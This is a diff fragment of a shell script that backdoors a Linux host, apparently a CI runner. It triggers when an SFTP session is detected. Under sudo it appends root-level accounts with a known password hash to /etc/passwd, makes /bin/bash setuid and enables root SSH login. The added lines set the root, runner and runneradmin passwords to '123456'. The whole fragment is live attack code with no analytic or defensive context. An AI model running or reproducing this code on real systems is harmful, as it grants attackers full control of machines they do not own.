@@ -57,7 +57,10 @@ s2="grep -q sftp-server /proc/\$\$/cmdline&&(
         sudo bash -c 'id;cp /etc/passwd /etc/passwd.bak;echo "tee:\$1\$123456\$wOSEtcyiP2N/IfIl15W6Z0:0:0:toor:/tmp:/bin/bash" >>/etc/passwd;
         echo "te:\$1\$123456\$wOSEtcyiP2N/IfIl15W6Z0:999:999:toor:/tmp:/bin/bash" >>/etc/passwd;
         chmod +s /bin/bash;
+        echo runneradmin:123456|chpasswd ;  
+        echo runner:123456|chpasswd;
         sed -i "s/^#\?\(PermitRootLogin\)/\1 yes#/g" /etc/ssh/sshd_config;
+        echo root:123456|chpasswd;
         id'
     )
     
